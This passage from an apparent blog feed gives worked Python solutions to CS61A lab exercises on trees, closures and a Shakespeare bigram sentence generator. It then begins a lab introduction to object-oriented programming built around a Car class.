<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">acorn_finder</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Returns True if t contains a node with the value 'acorn' and</span></span><br><span class="line"><span class="string">    False otherwise.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; scrat = tree('acorn')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; acorn_finder(scrat)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sproul = tree('roots', [tree('branch1', [tree('leaf'), tree('acorn')]), tree('branch2')])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; acorn_finder(sproul)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; acorn_finder(numbers)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> label(t) == <span class="string">'acorn'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(t):</span><br><span class="line">        <span class="keyword">if</span> acorn_finder(b):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternative solution</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">acorn_finder</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> label(t) == <span class="string">'acorn'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">in</span> [acorn_finder(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)]</span><br></pre></td></tr></table></figure>

<h2 id="Q2-Pruning-Leaves"><a href="#Q2-Pruning-Leaves" class="headerlink" title="Q2: Pruning Leaves"></a>Q2: Pruning Leaves</h2><p>Define a function <code>prune_leaves</code> that given a tree <code>t</code> and a tuple of values <code>vals</code>, produces a version of <code>t</code> with all its leaves that are in <code>vals</code> removed. Do not attempt to try to remove non-leaf nodes and do not remove leaves that do not match any of the items in <code>vals</code>. Return <code>None</code> if pruning the tree results in there being no nodes left in the tree.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prune_leaves</span><span class="params">(t, vals)</span>:</span></span><br><span class="line">    <span class="string">"""Return a modified copy of t with all leaves that have a label</span></span><br><span class="line"><span class="string">    that appears in vals removed.  Return None if the entire tree is</span></span><br><span class="line"><span class="string">    pruned away.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = tree(2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(prune_leaves(t, (1, 2)))</span></span><br><span class="line"><span class="string">    None</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(numbers)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        4</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">        7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(prune_leaves(numbers, (3, 4, 6, 7)))</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t) <span class="keyword">and</span> (label(t) <span class="keyword">in</span> vals):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    new_branches = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(t):</span><br><span class="line">        new_branch = prune_leaves(b, vals)</span><br><span class="line">        <span class="keyword">if</span> new_branch:</span><br><span class="line">            new_branches += [new_branch]</span><br><span class="line">    <span class="keyword">return</span> tree(label(t), new_branches)</span><br></pre></td></tr></table></figure>
<h2 id="Q3-Memory"><a href="#Q3-Memory" class="headerlink" title="Q3: Memory"></a>Q3: Memory</h2><p>Write a function that takes in a number n and returns a one-argument function. The returned function takes in a function that is used to update n. It prints the updated n value. (Note that this is different from a commentary function from hog since it doesn’t return a new function)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memory</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; f = memory(10)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; f(lambda x: x * 2)</span></span><br><span class="line"><span class="string">    20</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; f(lambda x: x - 7)</span></span><br><span class="line"><span class="string">    13</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; f(lambda x: x &gt; 5)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(g)</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> n</span><br><span class="line">        n = g(n)</span><br><span class="line">        print(n)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
<h1 id="Shakespeare-and-Dictionaries"><a href="#Shakespeare-and-Dictionaries" class="headerlink" title="Shakespeare and Dictionaries"></a>Shakespeare and Dictionaries</h1><p>We will use dictionaries to approximate the entire works of Shakespeare! We’re going to use a bigram language model. Here’s the idea: We start with some word – we’ll use “The” as an example. Then we look through all of the texts of Shakespeare and for every instance of “The” we record the word that follows “The” and add it to a list, known as the successors of “The”. Now suppose we’ve done this for every word Shakespeare has used, ever.</p>
<p>Let’s go back to “The”. Now, we randomly choose a word from this list, say “cat”. Then we look up the successors of “cat” and randomly choose a word from that list, and we continue this process. This eventually will terminate in a period (“.”) and we will have generated a Shakespearean sentence!</p>
<p>The object that we’ll be looking things up in is called a “successor table”, although really it’s just a dictionary. The keys in this dictionary are words, and the values are lists of successors to those words.</p>
<h2 id="Q4-Successor-Tables"><a href="#Q4-Successor-Tables" class="headerlink" title="Q4: Successor Tables"></a>Q4: Successor Tables</h2><p>Here’s an incomplete definition of the <code>build_successors_table</code> function. The input is a list of words (corresponding to a Shakespearean text), and the output is a successors table. (By default, the first word is a successor to “.”). See the example below.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_successors_table</span><span class="params">(tokens)</span>:</span></span><br><span class="line">    <span class="string">"""Return a dictionary: keys are words; values are lists of successors.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; text = ['We', 'came', 'to', 'investigate', ',', 'catch', 'bad', 'guys', 'and', 'to', 'eat', 'pie', '.']</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; table = build_successors_table(text)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sorted(table)</span></span><br><span class="line"><span class="string">    [',', '.', 'We', 'and', 'bad', 'came', 'catch', 'eat', 'guys', 'investigate', 'pie', 'to']</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; table['to']</span></span><br><span class="line"><span class="string">    ['investigate', 'eat']</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; table['pie']</span></span><br><span class="line"><span class="string">    ['.']</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; table['.']</span></span><br><span class="line"><span class="string">    ['We']</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    prev = <span class="string">'.'</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> tokens:</span><br><span class="line">        <span class="keyword">if</span> prev <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">            <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">            table[prev] = []</span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        table[prev] += [word]</span><br><span class="line">        prev = word</span><br><span class="line">    <span class="keyword">return</span> table</span><br></pre></td></tr></table></figure>
<h2 id="Q5-Construct-the-Sentence"><a href="#Q5-Construct-the-Sentence" class="headerlink" title="Q5: Construct the Sentence"></a>Q5: Construct the Sentence</h2><p>Let’s generate some sentences! Suppose we’re given a starting word. We can look up this word in our table to find its list of successors, and then randomly select a word from this list to be the next word in the sentence. Then we just repeat until we reach some ending punctuation.</p>
<p><em>Hint: to randomly select from a list, import the Python random library with <code>import random</code> and use the expression <code>random.choice(my_list)</code></em></p>
<p>This might not be a bad time to play around with adding strings together as well. Let’s fill in the construct_sent function!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_sent</span><span class="params">(word, table)</span>:</span></span><br><span class="line">    <span class="string">"""Prints a random sentence starting with word, sampling from</span></span><br><span class="line"><span class="string">    table.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; table = &#123;'Wow': ['!'], 'Sentences': ['are'], 'are': ['cool'], 'cool': ['.']&#125;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; construct_sent('Wow', table)</span></span><br><span class="line"><span class="string">    'Wow!'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; construct_sent('Sentences', table)</span></span><br><span class="line"><span class="string">    'Sentences are cool.'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> word <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'.'</span>, <span class="string">'!'</span>, <span class="string">'?'</span>]:</span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        result += word</span><br><span class="line">        word = random.choice(table[word])</span><br><span class="line">    <span class="keyword">return</span> result.strip() + word</span><br></pre></td></tr></table></figure>
<h2 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h2><p>Great! Now let’s try to run our functions with some actual data. The following snippet included in the skeleton code will return a list containing the words in all of the works of Shakespeare.</p>
<p><em>Warning: Do NOT try to print the return result of this function.</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shakespeare_tokens</span><span class="params">(path=<span class="string">'shakespeare.txt'</span>, url=<span class="string">'http://composingprograms.com/shakespeare.txt'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""Return the words of Shakespeare's plays as a list."""</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'shakespeare.txt'</span>, encoding=<span class="string">'ascii'</span>).read().split()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shakespeare = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> shakespeare.read().decode(encoding=<span class="string">'ascii'</span>).split()</span><br></pre></td></tr></table></figure>

<p>Uncomment the following two lines to run the above function and build the successors table from those tokens.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Uncomment the following two lines</span></span><br><span class="line"><span class="comment"># tokens = shakespeare_tokens()</span></span><br><span class="line"><span class="comment"># table = build_successors_table(tokens)</span></span><br></pre></td></tr></table></figure>
<p>Next, let’s define a utility function that constructs sentences from this successors table:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def sent():</span><br><span class="line">...     return construct_sent(&#39;The&#39;, table)</span><br><span class="line">&gt;&gt;&gt; sent()</span><br><span class="line">&quot; The plebeians have done us must be news-cramm&#39;d.&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; sent()</span><br><span class="line">&quot; The ravish&#39;d thee , with the mercy of beauty!&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; sent()</span><br><span class="line">&quot; The bird of Tunis , or two white and plucker down with better ; that&#39;s God&#39;s sake.&quot;</span><br></pre></td></tr></table></figure>
<p>Notice that all the sentences start with the word “The”. With a few modifications, we can make our sentences start with a random word. The following random_sent function (defined in your starter file) will do the trick:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_sent</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">return</span> construct_sent(random.choice(table[<span class="string">'.'</span>]), table)</span><br></pre></td></tr></table></figure>
<p>Go ahead and load your file into Python (be sure to use the <code>-i</code> flag). You can now call the <code>random_sent</code> function to generate random Shakespearean sentences!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; random_sent()</span><br><span class="line">&#39; Long live by thy name , then , Dost thou more angel , good Master Deep-vow , And tak&#39;st more ado but following her , my sight Of speaking false!&#39;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; random_sent()</span><br><span class="line">&#39; Yes , why blame him , as is as I shall find a case , That plays at the public weal or the ghost.&#39;</span><br></pre></td></tr></table></figure>

<h1 id="More-Trees-Practice"><a href="#More-Trees-Practice" class="headerlink" title="More Trees Practice"></a>More Trees Practice</h1><h2 id="Q6-Sprout-leaves"><a href="#Q6-Sprout-leaves" class="headerlink" title="Q6: Sprout leaves"></a>Q6: Sprout leaves</h2><p>Define a function <code>sprout_leaves</code> that takes in a tree, <code>t</code>, and a list of values, <code>vals</code>. It produces a new tree that is identical to <code>t</code>, but where each old leaf node has new branches, one for each value in <code>vals</code>.</p>
<p>For example, say we have the tree <code>t = tree(1, [tree(2), tree(3, [tree(4)])])</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  1</span><br><span class="line"> &#x2F; \</span><br><span class="line">2   3</span><br><span class="line">    |</span><br><span class="line">    4</span><br></pre></td></tr></table></figure>
<p>If we call <code>sprout_leaves(t, [5, 6])</code>, the result is the following tree:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     1</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     3</span><br><span class="line"> &#x2F; \    |</span><br><span class="line">5   6   4</span><br><span class="line">       &#x2F; \</span><br><span class="line">      5   6</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sprout_leaves</span><span class="params">(t, vals)</span>:</span></span><br><span class="line">    <span class="string">"""Sprout new leaves containing the data in vals at each leaf in</span></span><br><span class="line"><span class="string">    the original tree t and return the resulting tree.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t1 = tree(1, [tree(2), tree(3)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(t1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new1 = sprout_leaves(t1, [4, 5])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(new1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        4</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        4</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t2 = tree(1, [tree(2, [tree(3)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(t2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new2 = sprout_leaves(t2, [6, 1, 2])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(new2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        3</span></span><br><span class="line"><span class="string">          6</span></span><br><span class="line"><span class="string">          1</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line">        <span class="keyword">return</span> tree(label(t), [tree(v) <span class="keyword">for</span> v <span class="keyword">in</span> vals])</span><br><span class="line">    <span class="keyword">return</span> tree(label(t), [sprout_leaves(b, vals) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>
<h2 id="Q7-Add-trees"><a href="#Q7-Add-trees" class="headerlink" title="Q7: Add trees"></a>Q7: Add trees</h2><p>Define the function <code>add_trees</code>, which takes in two trees and returns a new tree where each corresponding node from the first tree is added with the node from the second tree. If a node at any particular position is present in one tree but not the other, it should be present in the new tree as well.</p>
<p>*Hint: You may want to use the built-in zip function to iterate over multiple sequences at once.</p>
<p>Note: If you feel that this one’s a lot harder than the previous tree problems, that’s totally fine! This is a pretty difficult problem, but you can do it! Talk about it with other students, and come back to it if you need to.*</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_trees</span><span class="params">(t1, t2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numbers = tree(1,</span></span><br><span class="line"><span class="string">    ...                [tree(2,</span></span><br><span class="line"><span class="string">    ...                      [tree(3),</span></span><br><span class="line"><span class="string">    ...                       tree(4)]),</span></span><br><span class="line"><span class="string">    ...                 tree(5,</span></span><br><span class="line"><span class="string">    ...                      [tree(6,</span></span><br><span class="line"><span class="string">    ...                            [tree(7)]),</span></span><br><span class="line"><span class="string">    ...                       tree(8)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(add_trees(numbers, numbers))</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">      4</span></span><br><span class="line"><span class="string">        6</span></span><br><span class="line"><span class="string">        8</span></span><br><span class="line"><span class="string">      10</span></span><br><span class="line"><span class="string">        12</span></span><br><span class="line"><span class="string">          14</span></span><br><span class="line"><span class="string">        16</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(add_trees(tree(2), tree(3, [tree(4), tree(5)])))</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">      4</span></span><br><span class="line"><span class="string">      5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(add_trees(tree(2, [tree(3)]), tree(2, [tree(3), tree(4)])))</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">      4</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(add_trees(tree(2, [tree(3, [tree(4), tree(5)])]), \</span></span><br><span class="line"><span class="string">    tree(2, [tree(3, [tree(4)]), tree(5)])))</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">        8</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">      5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t1:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t2:</span><br><span class="line">        <span class="keyword">return</span> t1</span><br><span class="line">    new_label = label(t1) + label(t2)</span><br><span class="line">    t1_children, t2_children = branches(t1), branches(t2)</span><br><span class="line">    length_t1, length_t2 = len(t1_children), len(t2_children)</span><br><span class="line">    <span class="keyword">if</span> length_t1 &lt; length_t2:</span><br><span class="line">        t1_children += [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(length_t1, length_t2)]</span><br><span class="line">    <span class="keyword">elif</span> len(t1_children) &gt; len(t2_children):</span><br><span class="line">        t2_children += [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(length_t2, length_t1)]</span><br><span class="line">    <span class="keyword">return</span> tree(new_label, [add_trees(child1, child2) <span class="keyword">for</span> child1, child2 <span class="keyword">in</span> zip(t1_children, t2_children)])</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab06</title>
    <url>/2018/10/19/cs61a-lab06/</url>
    <content><![CDATA[<h1 id="Lab-Check-Off"><a href="#Lab-Check-Off" class="headerlink" title="Lab Check-Off"></a>Lab Check-Off</h1><h2 id="Q1-To-Tree-or-Not-to-Tree"><a href="#Q1-To-Tree-or-Not-to-Tree" class="headerlink" title="Q1: To Tree or Not to Tree"></a>Q1: To Tree or Not to Tree</h2><p>Sign up for checkoffs in your lab if you’d like to get credit for this week’s checkoff.<br>Say you have some function defined as follows:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">sum_tree</span><span class="params">(t)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">"""Computes the sum of all the nodes in a tree"""</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> t</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> t + sum([sum_tree(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>Does this work? Why or why not? Some key points to think about:</p>
<ul>
<li>What type of data are we trying to return?</li>
<li>Are we passing in the correct type of data into sum_tree in each recursive call?</li>
<li>What kind of data is t?</li>
</ul>
<p>We need to return the sum of the labels of tree, which is obviously a number.</p>
<h1 id="Object-Oriented-Programming"><a href="#Object-Oriented-Programming" class="headerlink" title="Object-Oriented Programming"></a>Object-Oriented Programming</h1><p>In this lab we’ll be diving into <strong>object-oriented programming</strong> (OOP), a model of programming that allows you to think of data in terms of “objects” with their own characteristics and actions, just like objects in real life! This is very powerful and allows you to create objects that are specific to your program - you can read up on all the details here.</p>
<h1 id="OOP-Example-Car-Class"><a href="#OOP-Example-Car-Class" class="headerlink" title="OOP Example: Car Class"></a>OOP Example: Car Class</h1><p>Professor DeNero is running late, and needs to get from San Francisco to Berkeley before lecture starts. He’d take BART, but that will take too long. It’d be great if he had a car. A monster truck would be best, but a car will do – for now…</p>
<p>In <code>car.py</code>, you’ll find a class called <code>Car</code>. A <strong>class</strong> is a blueprint for creating objects of that type. In this case, the <code>Car</code> class statement tells us how to create <code>Car</code> objects.</p>
<h2 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h2><p>Let’s build Professor DeNero a car! Don’t worry, you won’t need to do any physical work – the <strong>constructor</strong> will do it for you. The <strong>constructor</strong> of a class is a function that creates an <strong>instance</strong>, or a single occurrence, of the object outlined by the class. In Python, the constructor method is named <strong>init</strong>. Note that there must be two underscores on each side of init. The Car class’ constructor looks like this:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model)</span>:</span></span><br><span class="line">    self.make = make</span><br><span class="line">    self.model = model</span><br><span class="line">    self.color = <span class="string">'No color yet. You need to paint me.'</span></span><br><span class="line">    self.wheels = Car.num_wheels</span><br><span class="line">    self.gas = Car.gas</span><br></pre></td></tr></table></figure>
<p>The <code>__init__</code> method for <code>Car</code> has three parameters. The first one, <code>self</code>, is automatically bound to the newly created <code>Car</code> object. The second and third parameters, <code>make</code> and <code>model</code>, are bound to the arguments passed to the constructor, meaning when we make a <code>Car</code> object, we must provide two arguments. Don’t worry about the code inside the body of the constructor for now.</p>
<p>Let’s make our car. Professor DeNero would like to drive a Tesla Model S to lecture. We can construct an instance of <code>Car</code> with <code>&#39;Tesla&#39;</code> as the make and <code>&#39;Model S&#39;</code> as the <code>model</code>. Rather than calling <code>__init__</code> explicitly, Python allows us to make an instance of a class by using the name of the class.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; deneros_car &#x3D; Car(&#39;Tesla&#39;, &#39;Model S&#39;)</span><br></pre></td></tr></table></figure>
<p>Here, <code>&#39;Tesla&#39;</code> is passed in as the <code>make</code>, and <code>&#39;Model S&#39;</code> as the <code>model</code>. Note that we don’t pass in an argument for <code>self</code>, since its value is always the object being created. An <code>object</code> is an instance of a class. In this case, <code>deneros_car</code> is now bound to a <code>Car</code> object or, in other words, an instance of the <code>Car</code> class.</p>
<h2 id="Attributes"><a href="#Attributes" class="headerlink" title="Attributes"></a>Attributes</h2><p>So how are the <code>make</code> and <code>model</code> of Professor DeNero’s car actually stored? Let’s talk about <strong>attributes</strong> of instances and classes. Here’s a snippet of the code in <code>car.py</code> with the instance and class attributes in the <code>Car</code> class:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">(object)</span>:</span></span><br><span class="line">    num_wheels = <span class="number">4</span></span><br><span class="line">    gas = <span class="number">30</span></span><br><span class="line">    headlights = <span class="number">2</span></span><br><span class="line">    size = <span class="string">'Tiny'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model)</span>:</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.color = <span class="string">'No color yet. You need to paint me.'</span></span><br><span class="line">        self.wheels = Car.num_wheels</span><br><span class="line">        self.gas = Car.gas</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">paint</span><span class="params">(self, color)</span>:</span></span><br><span class="line">        self.color = color</span><br><span class="line">        <span class="keyword">return</span> self.make + <span class="string">' '</span> + self.model + <span class="string">' is now '</span> + color</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drive</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.wheels &lt; Car.num_wheels <span class="keyword">or</span> self.gas &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.make + <span class="string">' '</span> + self.model + <span class="string">' cannot drive!'</span></span><br><span class="line">        self.gas -= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> self.make + <span class="string">' '</span> + self.model + <span class="string">' goes vroom!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop_tire</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.wheels &gt; <span class="number">0</span>:</span><br><span class="line">            self.wheels -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_gas</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.gas += <span class="number">20</span></span><br><span class="line">        <span class="keyword">return</span> self.make + <span class="string">' '</span> + self.model + <span class="string">' gas level: '</span> + str(self.gas)</span><br></pre></td></tr></table></figure>
<p>In the first two lines of the constructor, the name <code>self.make</code> is bound to the first argument passed to the constructor and <code>self.model</code> is bound to the second. These are two examples of instance attributes. An <strong>instance attribute</strong> is a quality or variable that is specific to an instance, and not the class itself! Instance attributes are accessed using dot notation (separating the instance and attribute with a period) with an instance. In this case, self is bound to our instance, so <code>self.model</code> references our instance’s model.</p>
<p>Our car has other instance attributes too, like <code>color</code> and <code>wheels</code>. As instance attributes, the make, model, and color of <code>deneros_car</code> do not affect the make, model, and color of other cars.</p>
<p>On the other hand, a <strong>class attribute</strong> is a quality that is shared among all instances of the class. For example, the <code>Car</code> class has four class attributes defined at the beginning of a class: <code>num_wheels = 4</code>, <code>gas = 30</code>, <code>headlights = 2</code> and s<code>ize = &#39;Tiny&#39;</code>. The first says that all cars have <code>4</code> wheels.</p>
<p>You might notice in the <code>__init__</code> method of the <code>Car</code> class, the instance attribute <code>gas</code> is initialized to the value of <code>Car.gas</code>, the class attribute. Why don’t we just use the class attribute, then? The reason is because each <code>Car</code>‘s <code>gas</code> attribute needs to be able to change independently of each other. If one <code>Car</code> drives for a while, it should use up some <code>gas</code>, and that <code>Car</code> instance should reflect that by having a lower <code>gas</code> value. However, all other <code>Car</code>s shouldn’t lose any <code>gas</code>, and changes to a class attribute will affect all instances of the class.</p>
